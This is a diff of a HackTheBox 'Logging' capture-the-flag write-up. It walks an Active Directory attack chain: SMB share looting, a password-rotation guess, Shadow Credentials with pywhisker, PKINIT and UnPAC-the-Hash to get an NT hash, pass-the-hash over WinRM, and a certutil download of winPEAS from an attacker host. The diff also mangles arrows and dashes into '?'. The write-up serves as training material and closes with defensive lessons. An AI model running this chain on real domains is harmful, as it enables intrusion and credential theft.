@@ -1,6 +1,6 @@
-﻿# Logging - HackTheBox Writeup
+# Logging - HackTheBox Writeup
 
-**Status:** 🚧 _Work in progress — user foothold achieved as `msa_health$`; root path under enumeration via `monitor.ps1`._
+**Status:** ?? _Work in progress  user foothold achieved as `msa_health$`; root path under enumeration via `monitor.ps1`._
 
 **Target:** `TARGET_IP` (10.129.41.161 at time of solve)
 **Domain:** `logging.htb`
@@ -15,25 +15,25 @@
 
 ```
 Given creds: wallace.everette:Welcome2026@
-    ↓
-SMB share enumeration → \Logs share readable
-    ↓
+    ?
+SMB share enumeration ? \Logs share readable
+    ?
 Log file leaks connection dump: svc_recovery:Em3rg3ncyPa$$2025  (expired)
-    ↓
-Year-rotation guess → Em3rg3ncyPa$$2026 → valid TGT for svc_recovery
-    ↓
-BloodHound as wallace.everette → svc_recovery has GenericWrite on msa_health$
-    ↓
-Shadow Credentials attack (pywhisker) → PFX cert for msa_health$
-    ↓
-PKINIT (gettgtpkinit) → TGT + AS-REP session key
-    ↓
-UnPAC-the-Hash (getnthash) → NT hash for msa_health$
-    ↓
-evil-winrm as msa_health$ → user foothold
-    ↓
-[WIP] Local enum → monitor.ps1 → privilege escalation path
-    ↓
+    ?
+Year-rotation guess ? Em3rg3ncyPa$$2026 ? valid TGT for svc_recovery
+    ?
+BloodHound as wallace.everette ? svc_recovery has GenericWrite on msa_health$
+    ?
+Shadow Credentials attack (pywhisker) ? PFX cert for msa_health$
+    ?
+PKINIT (gettgtpkinit) ? TGT + AS-REP session key
+    ?
+UnPAC-the-Hash (getnthash) ? NT hash for msa_health$
+    ?
+evil-winrm as msa_health$ ? user foothold
+    ?
+[WIP] Local enum ? monitor.ps1 ? privilege escalation path
+    ?
 Administrator (pending)
 ```
 
@@ -43,8 +43,8 @@ Administrator (pending)
 1. [Reconnaissance](#reconnaissance)
 2. [Environment Setup](#environment-setup)
 3. [SMB Share Enumeration](#smb-share-enumeration)
-4. [Credential Rotation Guess → svc_recovery](#credential-rotation-guess--svc_recovery)
-5. [BloodHound — Finding the ACL Path](#bloodhound--finding-the-acl-path)
+4. [Credential Rotation Guess ? svc_recovery](#credential-rotation-guess--svc_recovery)
+5. [BloodHound  Finding the ACL Path](#bloodhound--finding-the-acl-path)
 6. [Shadow Credentials via pywhisker](#shadow-credentials-via-pywhisker)
 7. [PKINIT + UnPAC-the-Hash](#pkinit--unpac-the-hash)
 8. [WinRM Foothold as msa_health$](#winrm-foothold-as-msa_health)
@@ -58,6 +58,8 @@ Administrator (pending)
 ### Port Discovery
 ```bash
 export TARGET=10.129.41.161
+# What it does: runs an Nmap scan with the specified ports/scripts/options.
+# Why here: identify exposed services and decide on the next enumeration.
 nmap -sS -p- --min-rate 5000 -n $TARGET
 nmap -sVC -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8530 $TARGET -oA service-scan
 ```
@@ -70,6 +72,8 @@ Standard DC footprint + `8530` (WSUS, hinting at `wsus.logging.htb`).
 
 ### Hosts file
 ```bash
+# What it does: adds machine domains to /etc/hosts.
+# Why here: resolve virtual hosts during web enumeration.
 echo "$TARGET logging.htb DC01.logging.htb wsus.logging.htb" | sudo tee -a /etc/hosts
 ```
 
@@ -78,6 +82,8 @@ echo "$TARGET logging.htb DC01.logging.htb wsus.logging.htb" | sudo tee -a /etc/
 Any Kerberos operation (TGT request, AS-REP, GetUserSPNs, getnthash) requires the clock to be within 5 minutes of the DC.
 
 ```bash
+# What it does: adjusts or synchronizes local time with the target/DC.
+# Why here: avoid Kerberos failures due to time skew.
 sudo timedatectl set-ntp false
 sudo ntpdate -u $TARGET
 ```
@@ -88,18 +94,24 @@ sudo ntpdate -u $TARGET
 
 ### List shares
 ```bash
+# What it does: enumerates or authenticates against Windows/AD services.
+# Why here: validar acceso, shares, usuarios o politicas.
 crackmapexec smb $TARGET --shares -u 'wallace.everette' -p 'Welcome2026@'
 ```
 
-Standard AD shares plus a **`Logs`** custom share — always interesting on HTB.
+Standard AD shares plus a **`Logs`** custom share  always interesting on HTB.
 
 ### Walk NETLOGON (baseline)
 ```bash
+# What it does: connects to an SMB resource and optionally executes an action.
+# Why here: listar, descargar o subir archivos por SMB.
 smbclient //$TARGET/NETLOGON -U wallace.everette%'Welcome2026@' -c 'recurse;ls'
 ```
 
 ### Dump the Logs share
 ```bash
+# What it does: connects to an SMB resource and optionally executes an action.
+# Why here: listar, descargar o subir archivos por SMB.
 smbclient //$TARGET/Logs -U wallace.everette%'Welcome2026@' -c 'recurse;ls'
 smbclient //$TARGET/Logs -U wallace.everette%'Welcome2026@'
 ```
@@ -117,21 +129,25 @@ Inside one of the log files, a **plaintext connection-context dump** is present:
 }
 ```
 
-Two service accounts are implied: `svc_recovery` and — via the share naming — `msa_health` (a managed service account).
+Two service accounts are implied: `svc_recovery` and  via the share naming  `msa_health` (a managed service account).
 
 ---
 
-## Credential Rotation Guess → svc_recovery
+## Credential Rotation Guess ? svc_recovery
 
 ### Test leaked creds
 ```bash
+# What it does: enumerates or authenticates against Windows/AD services.
+# Why here: validar acceso, shares, usuarios o politicas.
 crackmapexec smb $TARGET -u 'svc_recovery' -p 'Em3rg3ncyPa$$2025'
 ```
 
-**Result:** `STATUS_ACCOUNT_RESTRICTION` — authentication fails. The password is either expired, forced to change, or the account is hour-restricted. The log is from 2026-02 referencing `Em3rg3ncyPa$$2025` — the **password pattern is year-based** and looks stale.
+**Result:** `STATUS_ACCOUNT_RESTRICTION`  authentication fails. The password is either expired, forced to change, or the account is hour-restricted. The log is from 2026-02 referencing `Em3rg3ncyPa$$2025`  the **password pattern is year-based** and looks stale.
 
 ### Try next year in the rotation
 ```bash
+# What it does: executes an Impacket utility for AD/Windows.
+# Why here: extract tickets, hashes or protocol access for the chain.
 impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2026'
 ```
 
@@ -139,7 +155,7 @@ impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2026'
 [*] Saving ticket in svc_recovery.ccache
 ```
 
-The pattern held — password was rotated year-forward.
+The pattern held  password was rotated year-forward.
 
 ```bash
 export KRB5CCNAME=$(pwd)/svc_recovery.ccache
@@ -148,7 +164,7 @@ klist
 
 ---
 
-## BloodHound — Finding the ACL Path
+## BloodHound  Finding the ACL Path
 
 ### Collect the graph
 ```bash
@@ -159,12 +175,12 @@ bloodhound-python -u wallace.everette -p 'Welcome2026@' \
 Upload the zip to BloodHound and set `svc_recovery` as **Owned**.
 
 ### Key finding
-`svc_recovery` → **GenericWrite** → `MSA_HEALTH$`
+`svc_recovery` ? **GenericWrite** ? `MSA_HEALTH$`
 
 `GenericWrite` on a computer / MSA account enables two classic attacks:
 
-1. **Resource-Based Constrained Delegation (RBCD)** — requires control of another account with an SPN.
-2. **Shadow Credentials** — write `msDS-KeyCredentialLink` and authenticate via PKINIT.
+1. **Resource-Based Constrained Delegation (RBCD)**  requires control of another account with an SPN.
+2. **Shadow Credentials**  write `msDS-KeyCredentialLink` and authenticate via PKINIT.
 
 The DC runs Windows 2016+ and supports PKINIT, so **Shadow Credentials is the cleaner primitive** here.
 
@@ -174,6 +190,8 @@ The DC runs Windows 2016+ and supports PKINIT, so **Shadow Credentials is the cl
 
 ### User enumeration (context)
 ```bash
+# What it does: enumerates or authenticates against Windows/AD services.
+# Why here: validar acceso, shares, usuarios o politicas.
 crackmapexec smb $TARGET -u 'wallace.everette' -p 'Welcome2026@' --users
 rpcclient -U "logging.htb/wallace.everette%Welcome2026@" $TARGET -c "enumdomusers"
 ```
@@ -199,6 +217,8 @@ With `svc_recovery`'s TGT in the environment:
 ```bash
 export KRB5CCNAME=$(pwd)/svc_recovery.ccache
 
+# What it does: executes or compiles the script/program with the specified arguments.
+# Why here: launch the necessary exploit or helper in this phase.
 python3 pywhisker/pywhisker.py \
   -d "logging.htb" \
   -u "svc_recovery" --no-pass -k \
@@ -213,7 +233,7 @@ python3 pywhisker/pywhisker.py \
 [+] PFX password: Z7teStyyJxhoRZR6tGDd
 ```
 
-The `msDS-KeyCredentialLink` property on `MSA_HEALTH$` now contains our public key — we can authenticate as that account using the PFX.
+The `msDS-KeyCredentialLink` property on `MSA_HEALTH$` now contains our public key  we can authenticate as that account using the PFX.
 
 ---
 
@@ -222,13 +242,15 @@ The `msDS-KeyCredentialLink` property on `MSA_HEALTH$` now contains our public k
 ### Request a TGT with the certificate
 
 ```bash
+# What it does: executes or compiles the script/program with the specified arguments.
+# Why here: launch the necessary exploit or helper in this phase.
 python3 gettgtpkinit.py \
   -cert-pfx ../pywhisker/t9VbfvhY.pfx \
   -pfx-pass 'Z7teStyyJxhoRZR6tGDd' \
   logging.htb/msa_health\$ msa_health.ccache
 ```
 
-The tool also prints the **AS-REP session key** — keep it, we need it to decrypt the PAC and reveal the NT hash.
+The tool also prints the **AS-REP session key**  keep it, we need it to decrypt the PAC and reveal the NT hash.
 
 ```
 AS-REP encryption key:
@@ -243,6 +265,8 @@ export KRB5CCNAME=$(pwd)/msa_health.ccache
 ### UnPAC the hash
 
 ```bash
+# What it does: executes or compiles the script/program with the specified arguments.
+# Why here: launch the necessary exploit or helper in this phase.
 python3 getnthash.py \
   -key 'b0fed55e745ae9ffbba885d0cd7db34a16fb565a26ca1967c90b3968a7b7f0a6' \
   -dc-ip $TARGET logging.htb/msa_health\$
@@ -253,13 +277,15 @@ python3 getnthash.py \
 NT Hash: 603fc24ee01a9409f83c9d1d701485c5
 ```
 
-> **Why this works:** `gettgtpkinit` authenticates with a certificate and receives a TGT. The TGT includes a PAC encrypted with the AS-REP session key, and the PAC carries the account's NTLM credentials. `getnthash` decrypts the PAC and extracts the NT hash — giving us a credential usable with NTLM, PTH, WinRM, SMB, etc.
+> **Why this works:** `gettgtpkinit` authenticates with a certificate and receives a TGT. The TGT includes a PAC encrypted with the AS-REP session key, and the PAC carries the account's NTLM credentials. `getnthash` decrypts the PAC and extracts the NT hash  giving us a credential usable with NTLM, PTH, WinRM, SMB, etc.
 
 ---
 
 ## WinRM Foothold as msa_health$
 
 ```bash
+# What it does: opens a WinRM shell with the specified credentials/hash.
+# Why here: obtain interactive Windows access after validating credentials.
 evil-winrm -i $TARGET -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'
 ```
 
@@ -277,16 +303,20 @@ logging\msa_health$
 
 Host the payload locally:
 ```bash
+# What it does: starts a temporary HTTP server from the current directory.
+# Why here: serve payloads or files between attacker and victim.
 sudo python3 -m http.server 80
 ```
 
-From the shell (Meterpreter isn't available here — use `certutil` or `iwr`):
+From the shell (Meterpreter isn't available here  use `certutil` or `iwr`):
 ```powershell
+# What it does: executes a Windows command line action.
+# Why here: enumerate, transfer, replace or validate artifacts on the victim.
 certutil -urlcache -f http://<ATTACKER_IP>:80/winPEAS.ps1 winPEAS.ps1
 .\winPEAS.ps1 > resultados.txt 2>&1
 ```
 
-### Interesting artefact — `monitor.ps1`
+### Interesting artefact  `monitor.ps1`
 
 A custom PowerShell script in the environment is worth profiling:
 
@@ -296,7 +326,7 @@ Get-Content monitor.ps1
 Get-Acl monitor.ps1 | Format-List
 ```
 
-> ⚠️ **Pending**: identify _who_ runs `monitor.ps1`, _how often_ (scheduled task / service), and _whether_ the running account is `msa_health$` or a higher-privileged principal. If it runs as Administrator / SYSTEM and is writable by `msa_health$`, writing payload code into it yields privilege escalation.
+> ?? **Pending**: identify _who_ runs `monitor.ps1`, _how often_ (scheduled task / service), and _whether_ the running account is `msa_health$` or a higher-privileged principal. If it runs as Administrator / SYSTEM and is writable by `msa_health$`, writing payload code into it yields privilege escalation.
 
 This section will be expanded once root is reached.
 
@@ -307,23 +337,25 @@ This section will be expanded once root is reached.
 | Stage | Technique | Key Detail |
 |-------|-----------|------------|
 | **Share Triage** | SMB share enum with provided creds | Custom `\Logs` share leaked service-account context |
-| **Credential Pivot** | Year-rotation password guess | `Em3rg3ncyPa$$2025` → `Em3rg3ncyPa$$2026` worked |
+| **Credential Pivot** | Year-rotation password guess | `Em3rg3ncyPa$$2025` ? `Em3rg3ncyPa$$2026` worked |
 | **Graph Analysis** | BloodHound (`bloodhound-python`) | Exposed `GenericWrite` from `svc_recovery` onto `msa_health$` |
 | **ACL Abuse** | Shadow Credentials (pywhisker) | Wrote `msDS-KeyCredentialLink` to MSA account |
-| **Auth Upgrade** | PKINIT → UnPAC-the-Hash | Extracted NT hash from AS-REP-encrypted PAC |
+| **Auth Upgrade** | PKINIT ? UnPAC-the-Hash | Extracted NT hash from AS-REP-encrypted PAC |
 | **Foothold** | `evil-winrm -H` (PTH over WinRM) | Shell as `msa_health$` |
-| **Root** | _Pending — `monitor.ps1` path_ | Active enumeration |
+| **Root** | _Pending  `monitor.ps1` path_ | Active enumeration |
 
 ### Lessons so far
 
 1. **Never log credentials.** Verbose application logs dumping bind passwords are a recurring AD bootstrap vector.
 2. **Rotate by secret, not by rule.** Year-suffixed passwords leak the rotation logic as soon as one historical secret escapes.
 3. **ACLs beat passwords.** A single `GenericWrite` over an MSA, combined with PKINIT support, is a full authentication bypass.
-4. **Protect `msDS-KeyCredentialLink`.** Monitor writes to this attribute — Shadow Credentials shows up loudly in event 5136 with the right SACL.
+4. **Protect `msDS-KeyCredentialLink`.** Monitor writes to this attribute  Shadow Credentials shows up loudly in event 5136 with the right SACL.
 
 ### Related Notes
-- [netexec / crackmapexec](../../tools/recon/netexec.md) — SMB bind and share listing
-- [impacket](../../tools/windows/impacket.md) — `getTGT`
-- [evil-winrm](../../tools/windows/evil-winrm.md) — WinRM with hash auth
+- [netexec / crackmapexec](../../tools/recon/netexec.md)  SMB bind and share listing
+- [impacket](../../tools/windows/impacket.md)  `getTGT`
+- [evil-winrm](../../tools/windows/evil-winrm.md)  WinRM with hash auth
 - [Kerberos roasting notes](../../exploits/ad/kerberos-roasting.md) (for related AD ticketing)
 - _TODO_: dedicated `exploits/shadow-credentials.md` covering pywhisker + PKINIT + UnPAC workflow
+
+
